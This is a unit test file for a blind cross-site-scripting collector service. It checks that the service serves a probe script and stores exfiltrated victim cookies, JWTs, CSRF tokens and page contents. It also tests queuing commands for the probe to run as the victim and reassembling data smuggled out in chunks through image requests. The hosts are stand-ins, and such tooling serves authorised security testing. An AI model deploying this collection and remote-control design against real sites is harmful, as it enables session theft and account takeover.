// Deterministic server-side unit test of the REAL worker.js (no browser).
import worker from '../src/worker.js';
import { makeEnv } from './env.mjs';

const HOST = 'https://c.example.net';
let pass = 0, fail = 0;
function ok(name, cond, extra) { if (cond) { pass++; console.log('  PASS', name); } else { fail++; console.log('  FAIL', name, extra != null ? '-> ' + JSON.stringify(extra) : ''); } }
const req = (path, opts = {}) => worker.fetch(new Request(HOST + path, opts), env);

const env = makeEnv();

// 1. serve probe with substitution
{
  const r = await req('/c/tSUP');
  const body = await r.text();
  ok('probe served as JS', r.headers.get('Content-Type').includes('javascript'));
  ok('probe token substituted', body.includes("TOKEN = 'tSUP'") && !body.includes('__TOKEN__'), body.slice(0, 80));
  ok('probe base substituted', body.includes(HOST) && !body.includes('__BASE__'));
  ok('probe CORS on serve', r.headers.get('Access-Control-Allow-Origin') === '*');
}

// 2. full report via POST /r/:token
{
  const report = { sid: 's1', ts: Date.now(), url: 'https://victim.app/admin/logs', title: 'Log Viewer',
    origin: 'https://victim.app', ua: 'VictimUA', cookies: 'sess=abc; role=admin',
    storage: { local: { jwt: 'ey.j.j' }, session: {} }, dom: '<html>admin</html>',
    forms: [{ name: 'csrf', value: 'CSRF123' }], meta: { 'csrf-token': 'M-TOK' } };
  const r = await req('/r/tSUP', { method: 'POST', body: JSON.stringify(report) });
  const j = await r.json();
  ok('report accepted', j.ok === true && j.sid === 's1');
  ok('report CORS', r.headers.get('Access-Control-Allow-Origin') === '*');
  const rows = env._raw.prepare('SELECT * FROM reports WHERE sid=?').all('s1');
  ok('report row stored', rows.length === 1);
  ok('cookies stored', rows[0] && rows[0].cookies === 'sess=abc; role=admin');
  ok('storage JSON-serialized', rows[0] && JSON.parse(rows[0].storage).local.jwt === 'ey.j.j');
  ok('forms JSON-serialized', rows[0] && JSON.parse(rows[0].forms)[0].value === 'CSRF123');
  const sess = env._raw.prepare('SELECT * FROM sessions WHERE sid=?').all('s1');
  ok('session upserted', sess.length === 1 && sess[0].url === 'https://victim.app/admin/logs');
}

// 3. dashboard auth gate
{
  ok('dashboard denies no key', (await req('/')).status === 401);
  ok('dashboard denies bad key', (await req('/?key=wrong')).status === 401);
  const good = await req('/?key=testkey');
  ok('dashboard allows good key', good.status === 200 && (await good.text()).includes('blind-xss-collector'));
  ok('api denies no key', (await req('/api/sessions')).status === 401);
}

// 4. dashboard sees the session + report
{
  const ss = await (await req('/api/sessions?key=testkey')).json();
  ok('api/sessions lists session', ss.length === 1 && ss[0].sid === 's1');
  const reps = await (await req('/api/reports?key=testkey&sid=s1')).json();
  ok('api/reports returns report', reps.length === 1 && reps[0].title === 'Log Viewer');
}

// 5. interactive command lifecycle: queue -> poll -> result
{
  const q = await req('/api/cmd?key=testkey', { method: 'POST', body: JSON.stringify({ sid: 's1', cmd: 'fetch:/admin/secret' }) });
  ok('command queued', (await q.json()).ok === true);
  const polled = await (await req('/q/s1')).json();
  ok('probe polls the pending command', polled.length === 1 && polled[0].cmd === 'fetch:/admin/secret');
  const cmdId = polled[0].id;
  const polled2 = await (await req('/q/s1')).json();
  ok('polled command flips to sent (not re-served)', polled2.length === 0);
  await req('/qr/' + cmdId, { method: 'POST', body: JSON.stringify({ id: cmdId, result: 'SECRET-BODY-AS-VICTIM' }) });
  const res = await (await req('/api/cmdresults?key=testkey&sid=s1')).json();
  ok('command result recorded', res[0].status === 'done' && res[0].result === 'SECRET-BODY-AS-VICTIM');
}

// 6. CSP-fallback image-beacon: chunked report reassembly
{
  const payload = JSON.stringify({ sid: 's2', url: 'https://victim.app/p2', cookies: 'k=v', ua: 'ImgUA' });
  const b64 = encodeURIComponent(Buffer.from(payload, 'utf8').toString('base64'));
  const size = 40, n = Math.ceil(b64.length / size);
  let lastCT;
  for (let i = 0; i < n; i++) {
    const r = await req(`/p/tSUP?s=s2&f=r&i=${i}&n=${n}&d=${b64.substr(i * size, size)}`);
    lastCT = r.headers.get('Content-Type');
  }
  ok('image-beacon returns gif', lastCT === 'image/gif');
  const rows = env._raw.prepare('SELECT * FROM reports WHERE sid=?').all('s2');
  ok('chunked report reassembled + stored', rows.length === 1 && rows[0].url === 'https://victim.app/p2', rows[0]);
  const leftover = env._raw.prepare('SELECT COUNT(*) c FROM chunks WHERE sid=?').get('s2');
  ok('chunk buffer purged after reassembly', leftover.c === 0);
}

console.log(`\nRESULT: ${pass} passed, ${fail} failed`);
process.exit(fail ? 1 : 0);
